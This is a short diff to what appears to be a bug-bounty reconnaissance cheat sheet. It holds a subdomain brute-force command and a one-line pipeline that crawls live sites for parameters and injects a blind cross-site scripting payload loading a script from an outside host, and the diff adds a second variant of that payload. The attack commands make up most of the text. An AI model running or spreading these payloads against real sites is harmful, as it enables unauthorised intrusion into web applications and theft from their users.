@@ -5,6 +5,7 @@ dnsbruter -d BRUT.abc.xyz -w subdomains-top1million-5000.txt -c 300 -wt 100 -o d
 
 --------------------
 cat subs.txt | httpx -silent | katana -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss0r.com/c/lostsec></script>' -parameters
+cat subs.txt | httpx -silent | katana -f qurl | gf xss | bxss -appendMode -payload "'\"><script src=https://xss0r.com/c/lostsec></script>" -parameters
 ---------------------
 
 https://raw.githubusercontent.com/abdallaabdalrhman/Wordlist-for-Bug-Bounty/refs/heads/main/great_wordlist_for_bug_bounty.txt
